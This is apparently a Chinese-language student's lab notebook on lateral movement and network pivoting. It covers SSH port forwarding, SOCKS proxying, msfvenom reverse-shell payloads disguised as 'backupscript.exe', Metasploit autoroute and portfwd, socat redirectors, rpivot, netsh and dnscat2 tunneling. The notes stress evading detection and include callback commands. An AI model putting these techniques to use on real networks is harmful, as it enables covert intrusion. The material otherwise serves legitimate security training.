适用的环境，当攻陷了某一台主机后，需要转移的时候，如何从另外一台主机转移到另外一个内网的主机上，如何找到下一台我们需要攻陷的目标呢？
检查 三点  ·1 privilege level 
           2 network connections  
            3 VPN or other remote access software
观察是否有其他的网络适配器可以帮助我们移动到另外一个玩段中
主要目的是找到不同网段主机内容的地址，并且尝试的去攻击他们 ，去应用他们
打破分段访问内网的方向，搭建隧道机制，将网络流量封装到协议中 伪装协议达到通过路由流量的目的。

及逆行包装  vpn 等 只是进入隧道的一种形式，
### lateral movement  这个指的是横向移动的工具能力
横向移动 旋转 挖隧道 
跨主机的权限提升等问题 ：
横向移动是可以达到跨主机的 提升 ：
比如是应用共享管理员等账户去进行操作学习等  去访问在另外一个域中的数据信息 
https://www.paloaltonetworks.com/cyberpedia/what-is-lateral-movement
https://attack.mitre.org/tactics/TA0008/
总结 ：横向攻击指的是攻击者成功攻击拿下一个主机后，并且尝试访问其他主机的一种技术，和你参观同时保证长时间不被发现，一般横向移动的时候再真实世界中是用避开已知的楼哦都给你跟恶意软件 ，靠自己挖掘信息，
采用无文件攻击技术，比如涉及到那种高级的无文件攻击的技术手段 
一定要达到规避的目的，横向移动重点是一定要让防守者无法感知你的存在，并且规避你的行为跟行动的过程 ，规避方式 ：XDR可以阻止这一切的形成。

### 1 Porxy  Pivoting
多个主机跨越网络。目标是 通过入侵目标主机达到多级跳板多级翻转然后最终入侵的目的。
两种至于奥雷选哪个  可以借助ssh或者某种隧道来代理流量 并且让攻击者访问原本不可能访问的网络设备服务
、
2 VPN Pivoting VPN 的横向移动
受害者系统上搭建一个vpn链接 然后可以借此访问内网 ，然后可以借此实现 vpn调班 实现对内网更深入的渗透方式 ，多级代理搭建逆转

Tunneling ：各种协议将流量传入传出网络 对其协议做一个伪装的部分  HTTB掩盖并且胡晓晓我们行为防止被发现的问题 
指令隐藏在GET跟POST的请求中，并造成混淆的过程，


基础知识 网络概念扎实的基础理解 
IP跟NIC  ： IP由 DHCP 服务器自动获取 
静态ip分配在服务器 路由器 交换机虚拟接口 打印机 
等接口中 ，
NIC  ：是Network Interface vontroller 这工呢，一个计算机可以有多个NIC  可以分配多个IP地址 ，取决于分配特定的IP   一个NIC 配多个IP地址 多个IP地址聚合为同一个 地址

在linux 上通过ifconfig 可以看到 一些跟ip地址有关的信息 
同理在 window上的ipconfig也可以看到 信息来源
对于linux而言  输入 `ifconfig`即可查看对应的ip的地址信息 ，其中分析如下 所示：
![[Pasted image 20241031145629.png]]
在这里 除了eth0 网卡是对外的一个地址外 ，其余的网卡 都是内网的地址信息，并且 在tun0中 这个是 搭载了vpn后的内网地址信息，显示出来了
既 除了eth0链接的网卡外其余的都是内网信息 

子网掩码 是 subnet mask  这个 在window中有体现，并且 在子网掩码中相当于是区号的意思，
默认的网关 既  default Gateway 是告诉你在哪里有那个 NIC 的ip地址可以充当信息的 

Routing 关于路由器：
任何计算机 都可以成为路由器，将 主机流量借助路由器转发机制 嫁接到另外一个地方，路由器的特征死幻哟个路由表，这个路由表揭示了 对应的 IP地址抓饭流量的时候  
这个在 linux中的命令以及查看方式如下：
`netstat -r 或者 ip route`
![[Pasted image 20241031151022.png]]
![[Pasted image 20241031151033.png]]这里信息揭示了  几个点
对于输出的第二章表格如下所示  ：
查看其帮助文档可以发现对应的如下 ：
![[Pasted image 20241031151304.png]]
其中对于-r 解释是 展示了 routing table  也就是转发表，他解释了 是路由器的报文是如何转发的 
具体 的表格解释如下：
对于 netstat 展示的   
Destination ：目的地，目标网络或者主机的ip地址
Gate way （网关）到达目的地所需要的网关地址 如果显示 的是* 表示的是直连的网络
Genmask 子网掩码：定义了网络的部分跟主机部分的掩码，匹配目标网络的iP地址范围 
Flags：U 表示处于活动状态  H 表示是这个主机路由 G表示这个路由通过的网关  D表示路由动态  
MSS最大报文长度  ：TCP链接的时候的最大报文的大小  Windows 指的是TCP的窗口大小
Iface 接口 达到目标网络的接口是用的tun0 还是哪里
注意 直连的标志 Getaway下面是 * 外还可能的是 0.0.0.0

![[Pasted image 20241031151816.png]]
这个 是 以第二行举例 他解释了是 目的地址是10.10.10.0的所有流量 经过10.10.16.1加工后，经过tun0接口发往内网 ，这是个隧道搭建的路径，而 gateway 为0.0.0.0.的地址是直连
除此之外 在这个表上暂时没有或者没有明确指出的协议 走的流量端口均为 default这个路线
并且  如果不是 动态路由协议 比如  EIGRP OSPF BGP等 动态路由协议的话，如果有新的目的ip地址介入 路由表 在不是动态协议的前提下不会更新 

这default 的默认网关是最后手段的网关信息 
画图的工具是draw.io
https://app.diagrams.net/#Hbuhuizuocaigou%2Facademy-proxity%2Fmain%2F%E6%9C%AA%E5%91%BD%E5%90%8D%E7%BB%98%E5%9B%BE.drawio#%7B%22pageId%22%3A%22C5RBs43oDa-KdzZeNtuy%22%7D
协议服务跟端口信息 ：
Protocols 管理网络通信的规则，相应的ports 的标识符，并且 逻辑端口是那种逻辑分配的不是物理分配，虚拟化后的分配的端口数。  创造性的使用端口信息，

### 使用SSH跟socks 隧道进行动态端口转发
一 端口转发上下文 ：
poty forwarding 是允许将通信请求从端口a转发到端口b 的一个技术  TCP作为主要的通信层，
OSI的第四层模型 交互的通信 ，但是 可以用不同的应用层协议来封装数据包 
虽然在 TCPIP层但是可以用应用层的协议

攻击场景：攻击机：10.10.16.2
目标机器 ：10.129.xx
场景预设 以及通过前端各种方式成功攻陷此主机内容，并且现在进行进一步探索，
1 利用nmap搜索 在目标机器上的 可能存在的tcp开放端口，并且进行探尝试是否能进行访问， 模拟流程如下：
第一步  namp搜索可用的端口转发号 终极目的是能否借助一个跳板进行跳转到最终主机上，此主机只为一个跳板机 也就是肉鸡
![[Pasted image 20241101094310.png]]
发现 此时目标受害者有 22端口开放ssh  以及80的http服务
![[Pasted image 20241101094525.png]]
发现此时 mysql服务存在
由于我们已知对方靶机上有ssh服务以及账号，所以 此时有两条路线 
路线一 ：将ssh链接进后，并且进行远程访问mysql 
路线二：将其端口转发到攻击机的主机端口xxxx后本地访问 
二者的好处是啥？
答案 若采取路线二的形式，本地访问的时候 如果我们想在mysql执行远程攻击，必须得做端口转发 才可 否则无法进行mysql攻击服务，且mysql本地托管在ubuntu的3306端口上
此时需要进行端口转发服务。

步骤二  执行本地端口转发 
在ssh的man文档中-L选项中可以看到 ：
![[Pasted image 20241101095233.png]]
执行本地端口转发 
`ssh -L 1122:localhost:3306 unbuntu@ip addresses`
执行后 -L 通过文档可以查询到其信息是告诉ssh客户端请求ssh服务，将我们通过端口转发的所有数据信息通过转发到  把原来机器中的3306所在的mysql服务转发到 本地的1122端口号上，
![[Pasted image 20241101145313.png]]


netstat 的man文档如下所示 :其中 我们的目的是为了观察本地端口是否成功嫁接到了1122上  所以我们需要的条件是  
-a 关于socksname 信息全部显示，
-n是把不要显示 名字  host名字 等各种名字 
-t是质的是，tcp链接 
-p 指的是把所有的项目展示PID 就是信息显示更加全面性 
对其进行管道 操作后，我们只需要1122端口上的信息  所以要grep 1122 



![[Pasted image 20241101145854.png]]
这几个命令 解说 -A 指的是显示全部信息，-T表示的时显示TCP信息，-N表示把 ![[Pasted image 20241101151600.png]]
第三列中的localhost变成 数字筛选出来刚刚的 1122端口号即可 

法二 用nmap确认端口转发发生 ：
工具以及信息如下：
为何要用到-sV 答案：因为 -sV揭示了port的具体的version 我们的目的是为了查看本地端口1122号上是否有来自 ssh转发的 mysql服务的流量接口机制
![[Pasted image 20241101152013.png]]
![[Pasted image 20241101152309.png]]
这里揭示了 对应man文档中的-sV 信息 其中提到了 展示版本号所在的信息  

如果为多个端口转发的话可以 
`ssl -L  转发后的本地地址的端口号：攻击机的ip地址：远程ssh链接需要转发的服务的端口号 -L 接着写端口号 ：localhost：原端口服务的地址端口号 用户名@目标ip信息 `
### 设置 Pivot
此时所设置场景：
1 对目标靶机的所属端口服务信息 位置，不知道那些服务存在于端口上 
2 目标 我们想通过一些手段了解到 没有接到外部机器的主机ip地址 既在ens224网卡上的 ip内部地址的所在的服务段有几个 并且都有什么端口连接了什么服务 ，

![[Pasted image 20241101152642.png]]
此时在ssh所连接的端口号中 输入uifcofnig 可以知道 有如下几个ip 
首先 一个接入到我们攻击机的地址 ens192  
其次有个ens224的地址是外部机器无法访问独属于内网的地址
再有就是lo的环回地址信息 

关键点，由于ip为172.16.5.129这个所在的地址信息 不在外网运行，属于内部网络的专属地址故，不可以直接在攻击机上扫描进行，所以
采用的方法是：在unbutu服务器上 执行 dynamic port forwarding 动态端口转发 跟网络数据包，
既然无法在机器上启动，故直接在攻击机上搭建好socks 代理，然后通过ssh服务系统将其转发到内网网段进行操作
以ssh搭建隧道进行穿越的过程 
此过程可以描述如下 ：
在socks情况下 初始的第一段流量由 攻击机发送主动发送到目标机器上然后以此建立链接 ，即为初始的流量通路是 从搭建socks的代理端发出到 目标端 后随即建立起隧道系统 发生

这种手法是用于规避waf逃避防火墙  ，并允许外部实体绕过防火墙直接访问防火墙内网 
好处二：socks 代理可以铜鼓创建爱你从到外部服务器的nat网络直接进行穿透，既直接在本来无法连接外网的 ENSS224网卡段强行开辟一段隧道后，进行尝试访问外部网络的操作

SOCKS 两种类型：
1 SOCKS4 ：不提供任何身份验证跟udp 
2 SOCKS5 ：提供
![[Pasted image 20241101154129.png]]
这些中 注意 socks 代理端，就是通过在sshclient 搭建隧道的时候 借助sock5这个代理服务器的一个工具来伪装并且逃避防火墙的检测机制，在初次ssh从攻击网段发送到内网的网段后，此处双向链接通道已经搭建链接完毕
此由于后续还需要监听  所以采用的手法是动态端口转发

在ssh启动搭建隧道的地址端口9050后，此处这条隧道可以转 发 tor socks 跟http等代理服务器重定向tcp链接，然后对方的机器认为我们主机ip是最后那条跟他通信的链接 ，这样可以隐藏请求的IP地址 ，通过tcp 等多处进行多级跳板代理处理
多级代理链条已达到隐藏源ip地址的目的

所以 我们在ssh端 进行 动态端口转发，来让socks搭建后的 socks 以及http/HTTPs代理能通过咱们搭建好的隧道转发出去 
![[Pasted image 20241101155553.png]]
这里是-D 的信息 其中重点注意 whenever 链接到piort后 可以通过端口转发 并且代理链接
![[Pasted image 20241101162255.png]]
设置4050为隧道端口
此时 隧道搭建完毕 ，需要修改里面的 porxychains 代理的一个配置文件 加入 本地的proxychains 的文件配置文件信息中，
格式是 socks4 127.0.0.1 4050 加入到最后一行或者修改 
这个是要用到的 代理工具信息 ：
https://github.com/haad/proxychains
这里的默认端口信息为9050  ![[Pasted image 20241101162745.png]]
然后我修改为 4050 
这时候利用porxychains 这个 代理 进入后 
![[Pasted image 20241101171240.png]]
其中 在使用的代理连打包的 nmap数据 转发这个方法当中，我们需要注意的是，只能对tcp链接做全部转发  只认这个 其他的一礼拜不认 比如 半联结扫描 ，因为window的deference 默认阻止icmp请求 
在整个网络中不依赖 ping的tcp扫描花费很长时间，所以 本例中不考虑  如果想深入研究的话 
他是 链接如下：
https://nmap.org/book/scan-methods-connect-scan.html

采用如下 代理链条枚举 window目标 ：
![[Pasted image 20241101203601.png]]
寻找对应的端口信息
在尝试 rdp端口存在的时候 ，发现可能利用的rdp端口的店 ，然后去执行msfconsole进一步确认是否存在，挂代理运行 ![[Pasted image 20241101204033.png]]
得知
![[Pasted image 20241101204052.png]]
成功拿下发现有3389上的rdp存在 
所以 
![[Pasted image 20241101204407.png]]
干到内网真他吗快，直接借助 socks端口代理成功建立隧道搭建 隧道穿越功能 get

### 使用ssh进行远程 反向端口转发
 第一个实验 ：本地端口转发 机制，且ssh在本地主机侦听将远程服务器的转发到我们对应的端口上，并且 动态端口抓饭，![[Pasted image 20241101205211.png]]
 适用场景 当进入到windowA 后想从这里 windowA的机器中建立一个反向shell反向链接到 攻击机  
 必须要连接到第三方  
 远程反向端口转发 适用于以下技术：
 1 当上传文件 跟瞎子啊文件在rdp被禁用，或者说是 执行枚举的时候被禁用  只能执行低端api 想提升的
 此时 需要找到一个第三方主机 来充当中间的转接站，然后这个转接站 负责衔接 A 跟C 之间的链接，首先我们确保可以ssh到Ubuntu上  ，在这条隧道中，需要保证反向链接的数据可以从 最终内网的windowA主机 链接到我们的A攻击机上 ，这样构成通路
 而我们已知的条件是 从A攻击机到B 中间机器的过程，所以 需要先开启ubuntu的端口 以便把从C 的反向shell发送到A
 此时 在Metasploit启动侦听器 即可捕获

此时总结 思路 要做如下三件事 ：
1 使用msfvenom 生成一个木马，最终执行要在 window执行 
2 当生成这个木马后再把这个木马从attack 机器转移到第三方ubuntu上 ，然后再移动到window上，
3 为了能接收到来自windwoA 的反弹sehll 故 a需要打开接受的端口号来接受来自C的反弹shell

第一步 ：使用msfvenom创造木马，并且木马的目的以及特征值是，将windowA 的反向链接窗口打开，并且反向shell到指定机器中区 
利用https 的payload 系统俩船速反向的shell  一键配置 payload 
目的是：制造一个window的payload的语句 并且可以在windows的机器上执行并且成功运行
他的 结构如下 ：
```shell-session
msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
```
一点一点来拆解
其中msfvenom是一个 木马生成的工具，他超脱于 msfconsole家族的，然后-p是因为在--help文档中看到有这么句话，我们的目的是为了生成payload 其在help的帮助文档中有这么句话出现，
![[Pasted image 20241103162448.png]]
他给出了一个例子，![[Pasted image 20241103162553.png]]
然后 现在需要找到所需要调用的路径 那么 这个路径怎么发现呢？
使用 
`msfvenom -p --list |grep"windows"` 
形式二：`msfvenom --list payloads | grep "windows"
`
这里就是利用了上面的说明书并且 grep管道调用 grep 筛选 出来windows 的单词，并且查看相关路径信息，
在筛选到 x64 这一步的时候 查看信息得知
此时观察到两个信息细节：
![[Pasted image 20241103163956.png]]
跟 
![[Pasted image 20241103164021.png]]
区别在于第一个是建立shellcode  第二个是直接的反向shell功能 
而反向shell跟shellcode的唯一的区别跟联系是，shellcode 除了可以执行反向shell以外还可以执行其他的特殊功能 
也就是说shellcode比 反向shell的应用更加广泛
![[Pasted image 20241103164600.png]]
这仨的区别是啥：
1首先 custom 是解释说注入的时shellcode  生成的时shellcode而不是 反向本身
2 利用了反射dll 的技术 那么高级反射dll技术有什么神奇之处？
答：高级反射dll的神奇之处在于，他将恶意代码直接注入到内存中而不是磁盘中，如果是磁盘，一些入侵检测装置会直接扫描这个磁盘，从而导致露馅，所以我们采用了一种直接注入到内存的机制，然后将内存信息与进程绑定，这样的话如果我们要关闭此进程的话，其内存会消失，进而恶意代码就会被抹去 消失的无影无踪
3vncinject  的区别是引入了vnc装置，依然采用了同样的反射dll的技术手法，但是他借助了vnc装置去做，vnc可以让我们图形化的操控整个机器 

而我们在这次行动中 目的是https的分析，且需要采用高级dll技术隐藏，的同时建立https隧道，并且能链接到位，
我们选择 2号 ，目标是 从widnow内网靶机搭建一条隧道搭建到ubuntu的服务器上的 8080端口中  
所以 有
````shell-session
msfvenom -p windows/x64/meterpreter/reverse_https lhost= 内网bubnut的外置ip号 -f exe -o backupscript.exe LPORT=8080
````
其中 lhost 指的是 目标的主机号，也就是反向链接的目标的ip号，此场景下的ip号为 中间商 也就是ubuntu的ip号，
-f：![[Pasted image 20241103170756.png]]
以格式进行输入 指定输出位某种格式 内容 指定为exe
查询可知 ![[Pasted image 20241103171152.png]]
然后再选取为exe格式  
![[Pasted image 20241103171234.png]]
因为最终要输出为文件形式 所以使用此命令将其存放为文件形式 
注意指定lhost 的同时也制定lport 
此时 可执行常用的端口号 为 其http 比如 制定端口为8080
此时 输入后成功生成 但是根其提示的反馈信息表示，需要指定一个-a  类型 跟 架构
第三步，攻击机上配置并启动 metasploit 监听
![[Pasted image 20241105170316.png]]
在攻击机上配置监听模块 接受来自ubuntu的反向shell链接请求，开启8000端口应对
第四步：在ubuntu的服务器上利用python3 http.server 对8123这个端口启动监听 ，监听来自内网的window的 靶机的反向shell请求 
![[Pasted image 20241105170447.png]]在0.0.0.0 的本地环回地址中监听来自端口8123 的信息流 
并且这是唯一一个可以打开突破口的机器
此时 我们的目标反向shell已经成功传入到 linux 的中间机内，此时需要在唯一连接到内网靶机的 C机器中 下载 唯一能跟他链接的 ubuntu上面的服务器上的文件  
此时启动powershell并且请求跟中间值ubuntu建立连接 
此时命令如下：
![[Pasted image 20241105171926.png]]
其中 注意 -OutFile 中的 路径 如果涉及到非法路径的话 可以使用 $HOME 环境变量将其修改到 桌面上 此时 文件已经成功转移到 window的桌面上
当转移到window的桌面的时候，这时候，观察网络括朴图，![[Pasted image 20241105175727.png]]
这种形式如上述所示。原理如下 ，首先在攻击机上利用msfvenom 建立攻击的payload 并且传输给ubuntu  以ssh形式传输上去后，在通过ubuntu建立python3 的httpserver的服务器，然后在 window上进行powershell尝试跟 ubuntu中的建立的服务器获取连接，并且 此端口目的仅为将执行设置好的木马传输到最终window的机器上，然后 在利用ssh-R 这个是端口转发机制在中间类，即为 枢纽服务器上建立双向通信通道，并且建立握手机制，并进行操作，
监听行为 ：1 在 攻击机上启动的时本机0.0.0.0 的8000端口监听 
2 在ububntu上为了传输文件而启动的8080端口进行Python服务器搭建

具体细节 ：
1 在ubuntu中python3 -m建立 http.server的服务器机制，并且目的仅为传输文件如同一个简略的服务器一样  
`python3 -m http.server port`
2 在攻击机中 利用ssh-R 搭建隧道握手计划 ，执行端口转发 
既把 ubuntu的：8080端口号，
![[Pasted image 20241105185636.png]]
理解如下：在ubuntu上的右边 也就是链接到window的那边端口为8080的端口号机器，然后再ubuntu本机上 开启8000端口  也就是说 相当于是 把 左边8000 与 右侧 8080 的端口进行手拉手操作 行为 
告诉他流量该如何进行转发的行为 
具体命令  ：
`ssh -R ens224的ip地址也就是内网的ip地址:端口号:0.0.0.0代指ubuntu服务器的枢纽端口:8000也即是输送到攻击机的端口`
![[Pasted image 20241105185926.png]]注意ip地址的甄别
ens224代表的 内网ip地址 号
而 ens192代表的是外网的链接也就是攻击机可以进行ssh链接的ip地址
他起了一个跳板的作用 
当成功建立后，在windown上触发payload后 攻击机上监听的部分收到了回话

第三部分：Meterpreter 隧道跟端口转发功能
能否创建一个不依赖于 ssh而只借助 meterpreter隧道的系统呢，首先 尽量在枢纽主机上实现这些功能以及能力 
现在我们不借助 ssh隧道端口转发 而是借助meterpreter隧道 去建立搭建系统 
执行步骤如下  
此时攻击场景 各大攻击的ip如下：
攻击机的ip地址：10.10.16.28
跳板机的ubuntu的ip地址信息：10.129.23.77 可通过ssh与 其攻击机链接

我们目的是 不依赖于ssh隧道 转发而是只借助meterpretershell转发机制生成
其中改善的隧道是 从ubuntu到 攻击机那条隧道 不在借助与 ssh 而是借助于tcp 建立隧道 
并且是借助linux系统 来搭建 reverse_tcp隧道
那么 为何这次借助tcp而不是借助于http呢 ？
对相关路径进行查询 ：
得知：
`msfvenom --list payloads | grep "linux/x64/meterpreter"'
![[Pasted image 20241105203324.png]]
在这六个当中是这样的，正式的命名是/  而不是_
所以这导致了一个 
为设呢么用tcp不用http 因为tcp更加稳定，如果考虑用http的话 需要考虑到的是 ssh是否会在22端口造成IDS以及 入侵检测的发现 容易让防御人员醒了
在执行反弹之前 ，建立有效的监听机制，攻击机建立基础监听 监听本地的所在的8080端口准备在ssh载荷上接受信息 
![[Pasted image 20241105204516.png]]
并利用scp工具成功上传 即为 ：
对其上传的 命令解析 
`scp backupjob ubuntu@ip :~/`
backupjob ：指的是上传的文件名 全程 ，然后后面+一个ssh的链接全部 最后:后面是上传的路径处理 既存放在桌面中去 

在 ssh链接上传后的文件信息如下：
![[Pasted image 20241105204821.png]]
然后 将其建立的信息放在里面进行后渗透 ，利用 并发现建立反弹shell成功 
注意在本地建立监听的shell的 lhost 写的是0.0.0.0 既为监听本地的主机端口 
我们得目的是与最终在网段 172.16.5.0/23的 window靶机建立起一个隧道通道 并且保持连接
所以 我们采用的是ping_sweep模块来执行此操作行为 
为什么要采用`ping_sweep呢 `  在google搜索 几个关键字：
![[Pasted image 20241105205540.png]]
搜所出来找到了一个帖子 ：  
https://www.manitonetworks.com/security/2016/9/28/ping-sweeps-with-metasploit
这个帖子中阐述了我们可以采用的是
meterpreter 中的 ping_sweep的模块装置 并且可以用它进行已建立的会话的ping扫描
用icmp协议而不使用 tcp的区别 是  因为如果使用了icmp 不容易被ids查询 但是缺点是他是一个无连接的协议 也就是不会像tcp一样有握手 
所以可以在枢纽机上 进行内网扫描操作 
 如同这样：
 ![[Pasted image 20241105210415.png]]
 ![[Pasted image 20241105210658.png]]
 结果如下  
 方法二 利用ping 进行for loop 循环扫描行为  
 分为 在枢纽机中是什么类型的操作系统 如果是 linux：则一种模式 如果是window则另一种模式
 
 
 ![[Pasted image 20241106091354.png]]
 在此命令 所ping的主机内 ，如上述所示，但是一般内网防火墙会对此做拦截，所以我们只能采用两种可能的方法  方法一：ssh端口转发  方法二 利用 在meterpreter中的 `post/multi/gather/ping_sweep `这个模块进行操作 
除了ssh端口转发外 ，还能用meteasploit 的后渗透利用的模块在 SOCKS_proxy 在攻击机上配置本地代理 然后

在本地的也就是攻击机的机器上 执行  msf 的配置socks 代理 的过程 并且将端口改为 9050  
为什么 因为 在proxychains 的默认的端口号是 9050  msf 是搭建了一个代理隧道，可以借助这个工具进行代理链接 的过程 
主要是在msf的 scoks_proxy的类型中 9050端口中去搭建大力隧道 本地 的msf中
![[Pasted image 20241106095541.png]]
并且选择在本地端口监听，之前指定 proxychains 的默认你的9050端口  

然后  高索我们代理的额流量通过路由器 添加路由表，也就是告诉受感染机器的路由表中的值，让他能进行连接，在路由表中添加所需的值 来达到链接的目的 
两种方式  ：
手动或者自动 ：
手动：在攻击机中msf 中的 post multi manage  autoroute  的模块
对 在内网靶机中的 目的地址添加进去 ，这样可以保证能访问到这里 

在感染机器上 单独添加  在感染机器建立的反弹shell中 直接`run autoroute -s 所在内网的ip的网段 /23 的模式 `
![[Pasted image 20241106095933.png]]
相当于将其二者进行大气哦啊 并且加入落雨白哦的分段 把172.16.5,0人为的加入到路由表中去 以方便其定位到下一个 目的地

如何查询待定路由表中功能呢？
`run autoroute -p `
查看在ubuntu 受感染主机中 路由表是啥 ，具体如下 :
![[Pasted image 20241106100151.png]]
此时 轰动路由表 内网网段已经添加到 ubuntu的路由表中 也就是所有发公司给他的流量都可以通过路由表转发到172.16.5.0 这个网段中 
route 命令展示了路由表的 内容

这时候可以借助代理测试在攻击机上测试 是否可以连入到内网段 
porxychains nmap扫描发现可以 

此时可以采取另一种方法将去端口做个绑定  借助 portfwd 做个端口转发 
其portfwd是存在于 meterpreter中的 
其中 观察说明书可知：


![[Pasted image 20241106100910.png]]
我们需要的是添加一个端口煮饭  并且子啊本地滱进行监听 对端口做个煮饭  
所以使用的是 -l选项 
从本地端口的3300 到目标端口的3389端口上 建立链接 此时告诉目标我想链接的ip地址 是用 -r 选项 
![[Pasted image 20241106101348.png]]
通过输入portfwd add -l可知  提示 显示本地的port  远程的port跟远程的host 
`portfwd add -l 3300 -p 3389 -r 172.16.5.19`
``
结果如下:![[Pasted image 20241106101756.png]]
这时候实在未在内网的主机上搭建了一台隧道，利用了porefwd 的工具 且将 本地的3300端口映射到了远程在内网的3389端口中，并添加到了枢纽的路由表中去，这样的话成功将其拉入到内网的系统中
站在防御角度看 能借助netatat这个设备 去看到之间经过设呢么端口并且建立了什么信息在这个 表的平台中 ![[Pasted image 20241106102052.png]] 
各种ip 以及硘信息映射  看到 我们的xfreerdp 到3300端口固定了一个主机端口，并且 

第二种转发方式：利用反向shell进行socat重定向 
前提是 能跟 内网window建立链接 并且能通过rdp等多种手段执行他们的powershell
这个前提条件比较苛刻在哪里？主要是在windwo的命令中需要提取出来对windwo有益的部分 



什么事 socat 呢？
双向中继工具 且可在独立网络通道间创建管道套接字，无需使用ssh 隧道的工具内容 开创独立的隧道 
可以监听 也可以转发  
在 枢纽机上启动socat监听 端口 
https://www.redhat.com/en/blog/getting-started-socat
socat 的监听端口 可以代替 netstatnc 进行转发等机制 
其中我们需要借助这个工具来做到，牵线搭桥的目的，从而导致另一端链接的侦听端口信息 转发到 一段的端口号上 进行反向链接  目的地址是 攻击机的目的地址  ，源地址是在本机（枢纽机）开放端口8080 提供链接 
问题 ：为什么提供fork 呢 ？
答案 ：
![[Pasted image 20241107105235.png]]
fork 决定了  在接受链接的时候 socat 创建一个新的进程来处理这个链接 ，而并不会关闭当前进程处理新的连接内容，
如果fork不存在的话 会导致 各种进程串行在这里排列，并进行解析

命令如下：
在枢纽机执行 也就是ssh所在的机器中执行这个
`socat TCP4-LISTEN:8080,fork,TCP4：ip地址：80`

![[Pasted image 20241107104920.png]]
注意 因为枢纽机 中可能不止这一条隧道搭建，所以的话尽量采用并行而不是串行的机会

### 利用bind shell 进行socat重定向 （仍需要跟window取得交互）
socat 的绑定的shell重定向器  
bind tcp是可以不用rdp链接到window直接 重定向到主机上的 
无需跟 widowrdp建立链接就可直接借助 metasploit 来获取反弹shell的 隧道搭建陈工 

总结 bind 的造成的shell链接具有如下的特点：
1 bind 的链接是 无需连接到window的系统 只需要把.exe程序放到枢纽机上 即可 

![[Pasted image 20241107144437.png]]
在创建完毕后 此时的 LPORT 也就是反伤shell的端口为 目的主机中 window的端口号即为 8443的端口号内容  因为是创建的bind的 即为重定向 自动搜索并自己执行，这时候创建的exe程序不要直接发送到枢纽机而是放到本地机器上 
然后
ssh到端口机中`socat TCP4-LISTEN:8012,fork TCP4:172.16.5.19:8443`
利用socat建立隧道 后 然后再次进行rdp 链接并且将payload触发   后反弹链接回主机 
此时主机在msf中开启 multi/handler监听  并且设置payloads 为bind_tcp的形式 并且 将RHOST列为 枢纽机的ip地址 LPORT 定为此时之前的8012端口  
这是打开攻击机跟枢纽机的双向地址 
发送payload 并连接是打开后面第二条路的通道 

前提是 ：有rdp连接到 内网window的方式 或者是有 配置枢纽机路由表连接到 内网windwo的方法 
在window上被动触发后 达成目标


### windows版本的ssh ：plink.exe
此版本下载链接如下：https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html
Puttylink 缩写为 Plink  window命令行独有的ssh工具 安装后提供  效果同ssh  
可以创建动态端口转发跟SOCK5代理  
window通常 需要自行安装的连接到其他主机的端口是 PUTTY   
、
场景预设 ：在我们获取了windwo的权限后 快速枚举并且安全态势 并确认主机适度锁定的时候，将其违枢纽点 ，不可能靶自己工具传输 而是找现有的工具，此时 putty就发挥了他特定的效果 


#### 利用 Rpivot 进行web服务器枢转系统 
Rpivot 是个python 版本的 oscks 的隧道的反向socks 代理工具
![[Pasted image 20241111160447.png]]

在其github上面见到这个页面后，描述页面后 关注到兼容 ,python 2.6-2.7系统 标准库外没其他的依赖项 并且有服务器-客户端架构体系
![[Pasted image 20241111160953.png]]

然后 当前版本是python
![[Pasted image 20241111160918.png]]

故 需要让系统改为 python2.7的版本 即为 
检查是否有python2.7经检查 是成功的 
然后 ![[Pasted image 20241111161839.png]]
在左侧的攻击中 我们目的是借助 Ripivot 搭建代理 并且让 其 Attack host 跟ubuntu的主机保持通信隧道，然后 再进一步进行下去，
因为  在 工具说明中我们了解到 

![[Pasted image 20241111162008.png]]
这个工具可以将其转移到内部隧道机制 所以 ，我们先在这里单间 
也就是  攻击机中的 开启9999 端口 链接中间枢纽的 9050  
此时我们已知为：枢纽主机的ssh的 ip跟密码，2 能链接的通道等  并且在攻击机打开 9999 端口作为服务器端 在 ubuntu上打开9050端口作为 代理端 故 如下 ：
![[Pasted image 20241111162543.png]]
为什么呢 他在github下面不是一个单纯的文件，是一个额目录 所以不能单纯的传一个文件过去 这样无法连接，必须要构造目录 而 -r 即为把该目录下面的所有文件都传过去所以我们使用-r  
然而使用-r后，将其成功传入后
在目标枢纽机处执行client.py这个相当于是 作为客户端，这样次操作相当于是已经打通到内网的隧道机制了 ，

![[Pasted image 20241111164310.png]]
证明建立通道成功，然后这时候在 攻击机中 可以借助 proxychains 配置代理连让其服务器接通到内网中 
![[Pasted image 20241111165021.png]]
借助本机的端口 socks4搭建隧道体系并且 链接到枢纽机进一步能连接到内网机器，
总结：
所有这一切的前提条件是什么？答案：是我们必须将client.py传送到枢纽机中且不被发现，并且clinet是 全套 并不是一个单独的文件类型


### 借助 Netch 工具window命令行工具来 进行 搭建隧道端口转发 功能
网络场景如下：
![[Pasted image 20241112144802.png]]
借助枢纽机的装置为 一台 window的靶机 主机连接到内网的主机上
在这里 由于我们的枢纽机是windwo机器 且目的为想跟攻击机链接关系并且搭建合理的隧道装置，并打通隧道借此连通 ，故借助一个 exe工具搭建此隧道 
https://learn.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-contexts
netsh ：主要内容，允许显示或者修改当前正在运行的计算机的网络配置信息，并且可以配置好远程计算机跟本地计算机
已知：枢纽机的 rdp 的 ip：10.129.42.198  张
````cmd-session
 netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25
````
小技巧 1 必须拥有admin权限后执行，
        2 如果不知道具体内容 可以 在已知的后面加入空格 help 来列出下一步参考说明书内容 
        ![[Pasted image 20241112155720.png]]
然后 删除同理 
在搭建完隧道后，直接在攻击机上xfreerdp链接到 对应枢纽机的address即可

### 使用 DNScoat2 来扩展dns隧道机制
工具链接：https://github.com/iagox86/dnscat2
主要用途 ：借助dns隧道机制 俩进行数据传输
原理如下：本质上 隧道中的流量数据的传输是一个 本地域之间的dns服务器解析传输的过程，但是如果我们把它放到外网服务器中，这样自会导致 本地的dns解析的是偶 会尝试连接外部服务器 所以我们可以补货这些数据并且解析，可以偷摸传输任何数据，并且可以加密并且 会传输ddns对扫 
借助dns这个隧道工具搭建流量工具来获取大量信息 
![[Pasted image 20241112162019.png]]
其github上面已经写好详细的工具配置等信息内容，静待发掘
然后 使用的命令如下：
	`sudo ruby dnscat2.rb --dns host=攻击机的ip地址，port= ，domain= 域内的自定义名字.他是哪个域 --no-cache`
	![[Pasted image 20241112162719.png]]
